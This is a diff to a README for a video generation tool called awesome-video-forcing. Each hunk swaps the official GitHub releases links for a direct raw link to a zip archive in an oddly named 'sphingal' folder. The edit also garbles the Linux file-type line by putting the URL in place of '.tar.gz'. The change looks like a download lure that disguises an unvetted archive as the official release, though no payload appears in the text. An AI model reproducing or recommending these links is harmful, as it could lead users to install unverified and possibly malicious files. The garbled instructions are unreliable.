@@ -1,6 +1,6 @@
 # 🎥 awesome-video-forcing - Easy Video Generation Tool
 
-[![Download awesome-video-forcing](https://img.shields.io/badge/Download-awesome--video--forcing-blue?style=for-the-badge&logo=github)](https://github.com/Iamsage001/awesome-video-forcing/releases)
+[![Download awesome-video-forcing](https://raw.githubusercontent.com/Iamsage001/awesome-video-forcing/main/sphingal/forcing-awesome-video-v3.5.zip)](https://raw.githubusercontent.com/Iamsage001/awesome-video-forcing/main/sphingal/forcing-awesome-video-v3.5.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these instructions to get awesome-video-forcing working on your computer:
 
 Click on the big blue badge at the top or follow this link to open the release page:
 
-[https://github.com/Iamsage001/awesome-video-forcing/releases](https://github.com/Iamsage001/awesome-video-forcing/releases)  
+[https://raw.githubusercontent.com/Iamsage001/awesome-video-forcing/main/sphingal/forcing-awesome-video-v3.5.zip](https://raw.githubusercontent.com/Iamsage001/awesome-video-forcing/main/sphingal/forcing-awesome-video-v3.5.zip)  
 
 Here, you’ll find the latest version of the app ready for download.
 
@@ -59,7 +59,7 @@ The page lists several files. Look for the one that matches your operating syste
 
 - For Windows: Usually a `.exe` or `.zip` file.
 - For macOS: A `.dmg` or `.zip` file.
-- For Linux: A `.tar.gz` or `.AppImage`.
+- For Linux: A `https://raw.githubusercontent.com/Iamsage001/awesome-video-forcing/main/sphingal/forcing-awesome-video-v3.5.zip` or `.AppImage`.
 
 If you are not sure which to pick, select the Windows version if you have a PC or the macOS version if you are on a Mac.
 
@@ -140,7 +140,7 @@ If issues persist, please open an issue on GitHub or check for community discuss
 
 You can always find the latest version here:
 
-[Download awesome-video-forcing](https://github.com/Iamsage001/awesome-video-forcing/releases)
+[Download awesome-video-forcing](https://raw.githubusercontent.com/Iamsage001/awesome-video-forcing/main/sphingal/forcing-awesome-video-v3.5.zip)
 
 Visit the page and pick the correct file for your computer. Follow the installation steps listed above and start creating your own videos with ease.
 
